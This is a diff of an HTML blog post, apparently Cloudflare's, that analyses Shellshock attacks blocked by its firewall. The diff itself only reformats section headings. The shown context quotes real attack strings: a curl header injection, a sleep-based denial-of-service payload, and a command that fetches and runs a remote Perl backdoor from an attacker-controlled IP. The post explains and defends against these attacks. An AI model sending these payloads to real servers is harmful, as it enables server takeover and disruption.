@@ -14,7 +14,14 @@
 
 	</figure>
 	<p>(CC BY 2.0 <a href="https://www.flickr.com/photos/aussiegall">aussiegall</a>)</p>
-	<h2>Eject</h2>
+	<div class="flex anchor relative">
+		<h2 id="eject">Eject</h2>
+		<a href="https://blog.cloudflare.com/#eject" aria-hidden="true" class="relative sm:absolute sm:-left-5">
+			<svg width="16" height="16" viewBox="0 0 24 24">
+				<path fill="currentcolor" d="m12.11 15.39-3.88 3.88a2.52 2.52 0 0 1-3.5 0 2.47 2.47 0 0 1 0-3.5l3.88-3.88a1 1 0 0 0-1.42-1.42l-3.88 3.89a4.48 4.48 0 0 0 6.33 6.33l3.89-3.88a1 1 0 1 0-1.42-1.42Zm8.58-12.08a4.49 4.49 0 0 0-6.33 0l-3.89 3.88a1 1 0 0 0 1.42 1.42l3.88-3.88a2.52 2.52 0 0 1 3.5 0 2.47 2.47 0 0 1 0 3.5l-3.88 3.88a1 1 0 1 0 1.42 1.42l3.88-3.89a4.49 4.49 0 0 0 0-6.33ZM8.83 15.17a1 1 0 0 0 1.1.22 1 1 0 0 0 .32-.22l4.92-4.92a1 1 0 0 0-1.42-1.42l-4.92 4.92a1 1 0 0 0 0 1.42Z"></path>
+			</svg>
+		</a>
+	</div>
 	<p>The Shellshock problem is an example of an <a href="https://en.wikipedia.org/wiki/Arbitrary_code_execution">arbitrary code execution (ACE)</a> vulnerability. Typically, ACE vulnerability attacks are executed on programs that are running, and require a highly sophisticated understanding of the internals of code execution, memory layout, and assembly language—in short, this type of attack requires an expert.</p>
 	<p>Attacker will also use an ACE vulnerability to upload or run a program that gives them a simple way of controlling the targeted machine. This is often achieved by running a "shell". A shell is a command-line where commands can be entered and executed.</p>
 	<p>The Shellshock vulnerability is a major problem because it removes the need for specialized knowledge, and provides a simple (unfortunately, very simple) way of taking control of another computer (such as a web server) and making it run code.</p>
@@ -23,7 +30,14 @@
 	<pre class="language-bash"><code class="language-bash">curl -H "User-Agent: () { :; }; /bin/eject" http://example.com/</code></pre>
 	<p>would be enough to actually make the CD or DVD drive eject.</p>
 	<p>In monitoring the Shellshock attacks we've blocked, we've actually seen someone attempting precisely that attack. So, if you run a web server and suddenly find an ejected DVD it might be an indication that your machine is vulnerable to Shellshock.</p>
-	<h2>Why that simple attack works</h2>
+	<div class="flex anchor relative">
+		<h2 id="why-that-simple-attack-works">Why that simple attack works</h2>
+		<a href="https://blog.cloudflare.com/#why-that-simple-attack-works" aria-hidden="true" class="relative sm:absolute sm:-left-5">
+			<svg width="16" height="16" viewBox="0 0 24 24">
+				<path fill="currentcolor" d="m12.11 15.39-3.88 3.88a2.52 2.52 0 0 1-3.5 0 2.47 2.47 0 0 1 0-3.5l3.88-3.88a1 1 0 0 0-1.42-1.42l-3.88 3.89a4.48 4.48 0 0 0 6.33 6.33l3.89-3.88a1 1 0 1 0-1.42-1.42Zm8.58-12.08a4.49 4.49 0 0 0-6.33 0l-3.89 3.88a1 1 0 0 0 1.42 1.42l3.88-3.88a2.52 2.52 0 0 1 3.5 0 2.47 2.47 0 0 1 0 3.5l-3.88 3.88a1 1 0 1 0 1.42 1.42l3.88-3.89a4.49 4.49 0 0 0 0-6.33ZM8.83 15.17a1 1 0 0 0 1.1.22 1 1 0 0 0 .32-.22l4.92-4.92a1 1 0 0 0-1.42-1.42l-4.92 4.92a1 1 0 0 0 0 1.42Z"></path>
+			</svg>
+		</a>
+	</div>
 	<p>When a web server receives a request for a page there are three parts of the request that can be susceptible to the Shellshock attack: the request URL, the headers that are sent along with the URL, and what are known as "arguments" (when you enter your name and address on a web site it will typically be sent as arguments in the request).</p>
 	<p>For example, here's an actual HTTP request that retrieves the CloudFlare homepage:</p>
 	<pre class="language-bash"><code class="language-bash">GET / HTTP/1.1
@@ -50,7 +64,14 @@ HTTP_HOST=cloudflare.com</code></pre>
 	<p>If that variable gets passed into bash by the web server, the Shellshock problem occurs. This is because bash has special rules for handling a variable starting with <code>() { :; };</code>. Rather than treating the variable <code>HTTP_USER_AGENT</code> as a sequence of characters with no special meaning, bash will interpret it as a command that needs to be executed (I've omitted the deeply technical explanations of why <code>() { :; };</code> makes bash behave like this for the sake of clarity in this essay.)</p>
 	<p>The problem is that <code>HTTP_USER_AGENT</code> came from the <code>User-Agent</code> header which is something an attacker controls because it comes into the web server in an HTTP request. And that's a recipe for disaster because an attacker can make a vulnerable server run any command it wants (see examples below).</p>
 	<p>The solution is to upgrade bash to a version that doesn't interpret <code>() { :; };</code> in a special way.</p>
-	<h2>Where attacks are coming from</h2>
+	<div class="flex anchor relative">
+		<h2 id="where-attacks-are-coming-from">Where attacks are coming from</h2>
+		<a href="https://blog.cloudflare.com/#where-attacks-are-coming-from" aria-hidden="true" class="relative sm:absolute sm:-left-5">
+			<svg width="16" height="16" viewBox="0 0 24 24">
+				<path fill="currentcolor" d="m12.11 15.39-3.88 3.88a2.52 2.52 0 0 1-3.5 0 2.47 2.47 0 0 1 0-3.5l3.88-3.88a1 1 0 0 0-1.42-1.42l-3.88 3.89a4.48 4.48 0 0 0 6.33 6.33l3.89-3.88a1 1 0 1 0-1.42-1.42Zm8.58-12.08a4.49 4.49 0 0 0-6.33 0l-3.89 3.88a1 1 0 0 0 1.42 1.42l3.88-3.88a2.52 2.52 0 0 1 3.5 0 2.47 2.47 0 0 1 0 3.5l-3.88 3.88a1 1 0 1 0 1.42 1.42l3.88-3.89a4.49 4.49 0 0 0 0-6.33ZM8.83 15.17a1 1 0 0 0 1.1.22 1 1 0 0 0 .32-.22l4.92-4.92a1 1 0 0 0-1.42-1.42l-4.92 4.92a1 1 0 0 0 0 1.42Z"></path>
+			</svg>
+		</a>
+	</div>
 	<p>When we rolled out protection for all customers we put in place a metric that allowed us to monitor the number of Shellshock attacks attempted. They all received an HTTP 403 Forbidden error code, but we kept a log of when they occurred and basic information about the attack.</p>
 	<p>This chart shows the number of attacks per second across the CloudFlare network since rolling out protection for all customers.</p>
 	<figure class="kg-card kg-image-card ">
@@ -60,7 +81,14 @@ HTTP_HOST=cloudflare.com</code></pre>
 	</figure>
 	<p>From the moment CloudFlare turned on our Shellshock protection up until early this morning, we were seeing 10 to 15 attacks per second. In order of attack volume, these requests were coming from France (80%), US (7%), Netherlands (7%), and then smaller volumes from many other countries.</p>
 	<p>At about 0100 Pacific (1000 in Paris) the attacks from France ceased. We are currently seeing around 5 attacks per second. At the time of writing, we've blocked well over 1.1m Shellshock attacks.</p>
-	<h2>Let your imagination run wild</h2>
+	<div class="flex anchor relative">
+		<h2 id="let-your-imagination-run-wild">Let your imagination run wild</h2>
+		<a href="https://blog.cloudflare.com/#let-your-imagination-run-wild" aria-hidden="true" class="relative sm:absolute sm:-left-5">
+			<svg width="16" height="16" viewBox="0 0 24 24">
+				<path fill="currentcolor" d="m12.11 15.39-3.88 3.88a2.52 2.52 0 0 1-3.5 0 2.47 2.47 0 0 1 0-3.5l3.88-3.88a1 1 0 0 0-1.42-1.42l-3.88 3.89a4.48 4.48 0 0 0 6.33 6.33l3.89-3.88a1 1 0 1 0-1.42-1.42Zm8.58-12.08a4.49 4.49 0 0 0-6.33 0l-3.89 3.88a1 1 0 0 0 1.42 1.42l3.88-3.88a2.52 2.52 0 0 1 3.5 0 2.47 2.47 0 0 1 0 3.5l-3.88 3.88a1 1 0 1 0 1.42 1.42l3.88-3.89a4.49 4.49 0 0 0 0-6.33ZM8.83 15.17a1 1 0 0 0 1.1.22 1 1 0 0 0 .32-.22l4.92-4.92a1 1 0 0 0-1.42-1.42l-4.92 4.92a1 1 0 0 0 0 1.42Z"></path>
+			</svg>
+		</a>
+	</div>
 	<p>Since its so easy to attack vulnerable machines with Shellshock, and because a vulnerable machine will run any command sent to it, attackers have let their imaginations run wild with ways to manipulate computers remotely.</p>
 	<p>CloudFlare’s WAF logs the reason it blocked a request allowing us to extract and analyze the actual Shellshock strings being used. Shellshock is being used primarily for reconnaissance: to extract private information, and to allow attackers to gain control of servers.</p>
 	<p>Most of the Shellshock commands are being injected using the HTTP User-Agent and Referer headers, but attackers are also using GET and POST arguments and other random HTTP headers.</p>
@@ -78,7 +106,14 @@ HTTP_HOST=cloudflare.com</code></pre>
 
 	</figure>
 	<p>(CC BY 2.0 <a href="https://www.flickr.com/photos/jdhancock">JD Hancock</a>)</p>
-	<h2>Reconnaissance</h2>
+	<div class="flex anchor relative">
+		<h2 id="reconnaissance">Reconnaissance</h2>
+		<a href="https://blog.cloudflare.com/#reconnaissance" aria-hidden="true" class="relative sm:absolute sm:-left-5">
+			<svg width="16" height="16" viewBox="0 0 24 24">
+				<path fill="currentcolor" d="m12.11 15.39-3.88 3.88a2.52 2.52 0 0 1-3.5 0 2.47 2.47 0 0 1 0-3.5l3.88-3.88a1 1 0 0 0-1.42-1.42l-3.88 3.89a4.48 4.48 0 0 0 6.33 6.33l3.89-3.88a1 1 0 1 0-1.42-1.42Zm8.58-12.08a4.49 4.49 0 0 0-6.33 0l-3.89 3.88a1 1 0 0 0 1.42 1.42l3.88-3.88a2.52 2.52 0 0 1 3.5 0 2.47 2.47 0 0 1 0 3.5l-3.88 3.88a1 1 0 1 0 1.42 1.42l3.88-3.89a4.49 4.49 0 0 0 0-6.33ZM8.83 15.17a1 1 0 0 0 1.1.22 1 1 0 0 0 .32-.22l4.92-4.92a1 1 0 0 0-1.42-1.42l-4.92 4.92a1 1 0 0 0 0 1.42Z"></path>
+			</svg>
+		</a>
+	</div>
 	<p>By far the most popular attack we've seen (around 83% of all attacks) is called “reconnaissance”. In reconnaissance attacks, the attacker sends a command that will send a message to a third-party machine. The third-party machine will then compile a list of all the vulnerable machines that have contacted it.</p>
 	<p>In the past, we've seen lists of compromised machines being turned into botnets for DDoS, spam, or other purposes.</p>
 	<p>A popular reconnaissance technique uses the <code>ping</code> command to get a vulnerable machine to send a single packet (called a ping) to a third-party server that the attacker controls. The attack string looks like this:</p>
@@ -95,7 +130,14 @@ HTTP_HOST=cloudflare.com</code></pre>
 	<p><code>ZXhhbXBsZS5jb21TaGVsbFNob2NrU2FsdA==</code> is actually a <a href="https://en.wikipedia.org/wiki/Base64">base64</a> encoded string. When it is decoded it reads:</p>
 	<pre class="language-bash"><code class="language-bash">example.comShellShockSalt</code></pre>
 	<p>From this string the attacker can find out if their attack on example.com was successful, and, if so, they can then go back later to further exploit that site. While I've substituted out the domain that was the target, we are seeing real examples in the wild actually using <code>ShellShockSalt</code> as the salt in the hash.</p>
-	<h2>Denial of Service</h2>
+	<div class="flex anchor relative">
+		<h2 id="denial-of-service">Denial of Service</h2>
+		<a href="https://blog.cloudflare.com/#denial-of-service" aria-hidden="true" class="relative sm:absolute sm:-left-5">
+			<svg width="16" height="16" viewBox="0 0 24 24">
+				<path fill="currentcolor" d="m12.11 15.39-3.88 3.88a2.52 2.52 0 0 1-3.5 0 2.47 2.47 0 0 1 0-3.5l3.88-3.88a1 1 0 0 0-1.42-1.42l-3.88 3.89a4.48 4.48 0 0 0 6.33 6.33l3.89-3.88a1 1 0 1 0-1.42-1.42Zm8.58-12.08a4.49 4.49 0 0 0-6.33 0l-3.89 3.88a1 1 0 0 0 1.42 1.42l3.88-3.88a2.52 2.52 0 0 1 3.5 0 2.47 2.47 0 0 1 0 3.5l-3.88 3.88a1 1 0 1 0 1.42 1.42l3.88-3.89a4.49 4.49 0 0 0 0-6.33ZM8.83 15.17a1 1 0 0 0 1.1.22 1 1 0 0 0 .32-.22l4.92-4.92a1 1 0 0 0-1.42-1.42l-4.92 4.92a1 1 0 0 0 0 1.42Z"></path>
+			</svg>
+		</a>
+	</div>
 	<p>Another Shellshock attack uses this string</p>
 	<pre class="language-bash"><code class="language-bash">() { :;}; /bin/sleep 20|/sbin/sleep 20|/usr/bin/sleep 20</code></pre>
 	<p>It attempts to run the <code>sleep</code> command in three different ways (since systems have slightly different configurations, sleep might be found in the directories <code>/bin</code> or <code>/sbin</code> or <code>/usr/bin</code>). Whichever sleep it runs, it causes the server to wait 20 seconds before replying . That will consume resources on the machine because a thread or process executing the <code>sleep</code> will do nothing else for 20 seconds.</p>
@@ -106,7 +148,14 @@ HTTP_HOST=cloudflare.com</code></pre>
 
 	</figure>
 	<p>(CC BY 2.0 <a href="https://www.flickr.com/photos/petercastleton">peter castleton</a>)</p>
-	<h2>Taking Control</h2>
+	<div class="flex anchor relative">
+		<h2 id="taking-control">Taking Control</h2>
+		<a href="https://blog.cloudflare.com/#taking-control" aria-hidden="true" class="relative sm:absolute sm:-left-5">
+			<svg width="16" height="16" viewBox="0 0 24 24">
+				<path fill="currentcolor" d="m12.11 15.39-3.88 3.88a2.52 2.52 0 0 1-3.5 0 2.47 2.47 0 0 1 0-3.5l3.88-3.88a1 1 0 0 0-1.42-1.42l-3.88 3.89a4.48 4.48 0 0 0 6.33 6.33l3.89-3.88a1 1 0 1 0-1.42-1.42Zm8.58-12.08a4.49 4.49 0 0 0-6.33 0l-3.89 3.88a1 1 0 0 0 1.42 1.42l3.88-3.88a2.52 2.52 0 0 1 3.5 0 2.47 2.47 0 0 1 0 3.5l-3.88 3.88a1 1 0 1 0 1.42 1.42l3.88-3.89a4.49 4.49 0 0 0 0-6.33ZM8.83 15.17a1 1 0 0 0 1.1.22 1 1 0 0 0 .32-.22l4.92-4.92a1 1 0 0 0-1.42-1.42l-4.92 4.92a1 1 0 0 0 0 1.42Z"></path>
+			</svg>
+		</a>
+	</div>
 	<p>Around 8% of the attacks we've seen so far have been aimed at directly taking control of a server. Remote control attacks look like this:</p>
 	<pre class="language-bash"><code class="language-bash">() { :;}; /bin/bash -c \"cd /tmp;wget http://213.x.x.x/ji;curl -O /tmp/ji http://213.x.x.x/ji ; perl /tmp/ji;rm -rf /tmp/ji\"</code></pre>
 	<p>This command tries to use two programs (<code>wget</code> and <code>curl</code>) to downloaded a program from a server that the attacker controls. The program is written in the Perl language, and once downloaded it is immediately run. This program sets up remote access for an attacker to the vulnerable web server.</p>
@@ -119,7 +168,14 @@ HTTP_HOST=cloudflare.com</code></pre>
 
 	</figure>
 	<p>(CC BY 2.0 <a href="https://www.flickr.com/photos/custom-painting-studio">Jeff Taylor</a>)</p>
-	<h2>Target Selection</h2>
+	<div class="flex anchor relative">
+		<h2 id="target-selection">Target Selection</h2>
+		<a href="https://blog.cloudflare.com/#target-selection" aria-hidden="true" class="relative sm:absolute sm:-left-5">
+			<svg width="16" height="16" viewBox="0 0 24 24">
+				<path fill="currentcolor" d="m12.11 15.39-3.88 3.88a2.52 2.52 0 0 1-3.5 0 2.47 2.47 0 0 1 0-3.5l3.88-3.88a1 1 0 0 0-1.42-1.42l-3.88 3.89a4.48 4.48 0 0 0 6.33 6.33l3.89-3.88a1 1 0 1 0-1.42-1.42Zm8.58-12.08a4.49 4.49 0 0 0-6.33 0l-3.89 3.88a1 1 0 0 0 1.42 1.42l3.88-3.88a2.52 2.52 0 0 1 3.5 0 2.47 2.47 0 0 1 0 3.5l-3.88 3.88a1 1 0 1 0 1.42 1.42l3.88-3.89a4.49 4.49 0 0 0 0-6.33ZM8.83 15.17a1 1 0 0 0 1.1.22 1 1 0 0 0 .32-.22l4.92-4.92a1 1 0 0 0-1.42-1.42l-4.92 4.92a1 1 0 0 0 0 1.42Z"></path>
+			</svg>
+		</a>
+	</div>
 	<p>Looking at the web sites being attacked, and the URLs being requested, it's possible to make an educated guess at the specific web applications being attacked.</p>
 	<p>The top URLs we've seen attacked are: / (23.00%), /cgi-bin-sdb/printenv (15.12%), /cgi-mod/index.cgi (14.93%), /cgi-sys/entropysearch.cgi (15.20%) and /cgi-sys/defaultwebpage.cgi (14.59%). Some of these URLs are used by popular web applications and even a hardware appliance.</p>
 	<p>It appears that 23% of the attacks are directed against the <a href="http://cpanel.net">cPanel</a> web hosting control software, 15% against old Apache installations, and 15% against the <a href="https://www.barracuda.com">Barracuda</a> hardware products which have a web-based interface.</p>
